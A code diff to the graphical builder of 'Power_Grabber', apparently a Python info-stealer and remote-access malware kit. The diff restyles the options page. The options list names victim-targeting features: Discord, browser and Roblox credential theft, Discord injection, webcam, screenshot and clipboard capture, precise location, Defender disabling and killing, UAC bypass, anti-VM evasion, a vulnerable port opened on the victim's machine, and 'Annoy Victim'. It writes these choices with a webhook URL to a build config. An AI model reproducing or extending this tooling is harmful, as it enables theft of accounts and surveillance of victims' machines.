@@ -5,6 +5,7 @@ from tkinter import *
 import requests
 from io import BytesIO
 from PIL import Image, ImageTk
+import time
 class Power_Grabber(ctk.CTk):
     def __init__(self):
         super().__init__()
@@ -114,15 +115,22 @@ class Power_Grabber(ctk.CTk):
         filename_entry.bind("<Leave>", lambda e: off_hover(e, filename_entry))
 
         options_label = ctk.CTkLabel(page, text='Options:', 
-                                     font=('Arial', 24, 'bold'))
+                                    font=('Arial', 24, 'bold', 'italic'),
+                                    text_color='white')
         options_label.pack(pady=(0, 10))
 
+        hr = ctk.CTkFrame(page, height=2, width=400, fg_color='#FF6B6B', 
+                        border_width=1,
+                        border_color='#FF3535',
+                        corner_radius=5)
+        hr.pack(pady=(0, 10))
+
         checkbox_options = [
-            'Discord Info', 'Browser Info', 'System info', 'Games info', 'Webcam', 
-            'Screenshot', 'Self destruction', 'Obfuscate', 'Anti VM', 'Disable defender', 
-            'Exact location', 'Vulnerable port creation', 'UAC Bypass', 
-            'Send to your computer', 'Roblox account', 'Clipboard contents', 'Discord Injection',
-            'Ping', 'Kill defender', 'Self exclusion', 'Watch Dog'
+            'Anti VM', 'Annoy Victim (Audio)', 'Browser Info', 'Clipboard contents',
+            'Disable defender', 'Discord Info', 'Discord Injection', 'Exact location',
+            'Games info', 'Kill defender', 'Obfuscate', 'Roblox account', 'Self destruction',
+            'Self exclusion', 'TCP-IP Connection', 'Screenshot', 'System info',
+            'UAC Bypass', 'Vulnerable port creation', 'Webcam', 'Watch Dog'
         ]
         checkbox_frame = ctk.CTkFrame(page, fg_color='transparent')
         checkbox_frame.pack(fill=X)
@@ -131,31 +139,37 @@ class Power_Grabber(ctk.CTk):
             row = i // 3
             col = i % 3
             checkbox = ctk.CTkCheckBox(checkbox_frame, text=option, width=200, height=32,
-                                        fg_color='#FF6B6B', text_color='white', 
-                                        border_color='#FF3535', corner_radius=12)
+                                                fg_color='#FF6B6B', text_color='white', 
+                                                border_color='#FF3535', corner_radius=16,
+                                                hover_color='#FF3535',
+                                                checkmark_color='#FFFFFF',
+                                                border_width=1,
+                                                font=('Arial', 12, 'bold', 'italic'),
+                                                text_color_disabled='gray',
+                                                hover=True)
             checkbox.grid(row=row, column=col, padx=10, pady=5, sticky='w')
             checkbox_dict[option] = checkbox
-        discord_info_checkbox = checkbox_dict['Discord Info']
+        anti_vm_checkbox = checkbox_dict['Anti VM']
+        annoy_victim_checkbox = checkbox_dict['Annoy Victim (Audio)']
         browser_info_checkbox = checkbox_dict['Browser Info']
-        system_info_checkbox = checkbox_dict['System info']
+        clipboard_contents_checkbox = checkbox_dict['Clipboard contents']
+        disable_defender_checkbox = checkbox_dict['Disable defender']
+        discord_info_checkbox = checkbox_dict['Discord Info']
+        discord_injection_checkbox = checkbox_dict['Discord Injection']
+        exact_location_checkbox = checkbox_dict['Exact location']
         games_info_checkbox = checkbox_dict['Games info']
-        webcam_checkbox = checkbox_dict['Webcam']
+        kill_defender_checkbox = checkbox_dict['Kill defender']
+        obfuscate_checkbox = checkbox_dict['Obfuscate']
+        roblox_account_checkbox = checkbox_dict['Roblox account']
         screenshot_checkbox = checkbox_dict['Screenshot']
         self_destruct_checkbox = checkbox_dict['Self destruction']
-        obfuscate_checkbox = checkbox_dict['Obfuscate']
-        anti_vm_checkbox = checkbox_dict['Anti VM']
-        disable_defender_checkbox = checkbox_dict['Disable defender']
-        exact_location_checkbox = checkbox_dict['Exact location']
-        vulnerable_port_creation_checkbox = checkbox_dict['Vulnerable port creation']
-        uac_bypass_checkbox = checkbox_dict['UAC Bypass']
-        send_to_computer_checkbox = checkbox_dict['Send to your computer']
-        roblox_account_checkbox = checkbox_dict['Roblox account']
-        clipboard_contents_checkbox = checkbox_dict['Clipboard contents']
-        discord_injection_checkbox = checkbox_dict['Discord Injection']
-        ping_checkbox = checkbox_dict['Ping']
-        kill_defender_checkbox = checkbox_dict['Kill defender']
         self_exclusion_checkbox = checkbox_dict['Self exclusion']
+        TCP_IP_Connection_checkbox = checkbox_dict['TCP-IP Connection']
+        system_info_checkbox = checkbox_dict['System info']
+        uac_bypass_checkbox = checkbox_dict['UAC Bypass']
+        vulnerable_port_creation_checkbox = checkbox_dict['Vulnerable port creation']
         watchdog_checkbox = checkbox_dict['Watch Dog']
+        webcam_checkbox = checkbox_dict['Webcam']
         pumper_frame = ctk.CTkFrame(page, fg_color='transparent')
         pumper_frame.pack(fill=X, pady=(20, 0))
 
@@ -181,34 +195,34 @@ class Power_Grabber(ctk.CTk):
             webhook_url = webhook_entry.get()
             file_name = filename_entry.get()
             checkbox_statuses = {
-                "Discord-Info": bool(discord_info_checkbox.get()),
-                "Browser-Info": bool(browser_info_checkbox.get()),
-                "System-Info": bool(system_info_checkbox.get()),
-                "Games-Info": bool(games_info_checkbox.get()),
-                "Webcam": bool(webcam_checkbox.get()),
-                "Screenshot": bool(screenshot_checkbox.get()),
-                "Self-destruction": bool(self_destruct_checkbox.get()),
-                "Obfuscate": bool(obfuscate_checkbox.get()),
-                "Anti-VM": bool(anti_vm_checkbox.get()),
-                "Disable-Defender": bool(disable_defender_checkbox.get()),
-                "Location": bool(exact_location_checkbox.get()),
-                "Port-Creation": bool(vulnerable_port_creation_checkbox.get()),
-                "UAC-Bypass": bool(uac_bypass_checkbox.get()),
-                "TCP-IP": bool(send_to_computer_checkbox.get()),
-                "Roblox-Account": bool(roblox_account_checkbox.get()),
-                "Clipboard": bool(clipboard_contents_checkbox.get()),
-                "Discord-Injection": bool(discord_injection_checkbox.get()),
-                "Ping-Users": bool(ping_checkbox.get()),
-                "Kill-Defender": bool(kill_defender_checkbox.get()),
-                "Self-Exclusion": bool(self_exclusion_checkbox.get()),
-                "Watch-Dog": bool(watchdog_checkbox.get()),
-                "Filepumper-Value": pumper_combo.get(),
-                "Ping": ping_combo.get(),
+        "Annoy-Victim": bool(annoy_victim_checkbox.get()),
+        "Anti-VM": bool(anti_vm_checkbox.get()),
+        "Browser-Info": bool(browser_info_checkbox.get()),
+        "Clipboard": bool(clipboard_contents_checkbox.get()),
+        "Disable-Defender": bool(disable_defender_checkbox.get()),
+        "Discord-Info": bool(discord_info_checkbox.get()),
+        "Discord-Injection": bool(discord_injection_checkbox.get()),
+        "Exact-location": bool(exact_location_checkbox.get()),
+        "Games-Info": bool(games_info_checkbox.get()),
+        "Kill-Defender": bool(kill_defender_checkbox.get()),
+        "Obfuscate": bool(obfuscate_checkbox.get()),
+        "Roblox-Account": bool(roblox_account_checkbox.get()),
+        "Self-destruction": bool(self_destruct_checkbox.get()),
+        "Self-exclusion": bool(self_exclusion_checkbox.get()),
+        "TCP-IP-Connection": bool(TCP_IP_Connection_checkbox.get()),
+        "Screenshot": bool(screenshot_checkbox.get()),
+        "System-Info": bool(system_info_checkbox.get()),
+        "UAC-Bypass": bool(uac_bypass_checkbox.get()),
+        "Vulnerable-port-creation": bool(vulnerable_port_creation_checkbox.get()),
+        "Webcam": bool(webcam_checkbox.get()),
+        "Watch-Dog": bool(watchdog_checkbox.get()),
+        "Filepumper-Value": pumper_combo.get(),
+        "Ping": ping_combo.get(),
             }
 
             with open("config.txt", "w") as file:
                 file.write(f'Webhook: "{webhook_url}"\n')
-                file.write(f'File-Name: "{file_name}.exe"\n')
+                file.write(f'File-Name: "{file_name}.py"\n')
 
                 for option, status in checkbox_statuses.items():
                     file.write(f'{option}: {status}\n')
@@ -224,15 +238,11 @@ class Power_Grabber(ctk.CTk):
         credits_label.pack(pady=(0, 20))
         credits_text = """
         Thanks to the following people for their contributions:
-
-        - Creator/Owner:
-        - Powercascade
-
-        - Developers:
+        - The Developers:
         - Taktikal.exe: Provided crucial code for this project
         - Powercascade: Started the project and made most of the code
 
-        - Helpers:
+        - The Helpers:
         - TheOneWhoWatches: Paid Powercascade $20 to make this project and gave him the idea to make premium
 
         - Special thanks:
@@ -241,7 +251,7 @@ class Power_Grabber(ctk.CTk):
         - Existing:
         - LLucas1425
         """
-        credits_textbox = ctk.CTkTextbox(page, width=600, height=500, fg_color='#212127', text_color='white')
+        credits_textbox = ctk.CTkTextbox(page, width=700, height=500, fg_color='#212127', text_color='white')
         credits_textbox.pack(pady=10)
         credits_textbox.insert("1.0", credits_text)
         credits_textbox.configure(state="disabled")
@@ -265,4 +275,4 @@ class Power_Grabber(ctk.CTk):
 if __name__ == '__main__':
     app = Power_Grabber()
     app.mainloop()
-
+    
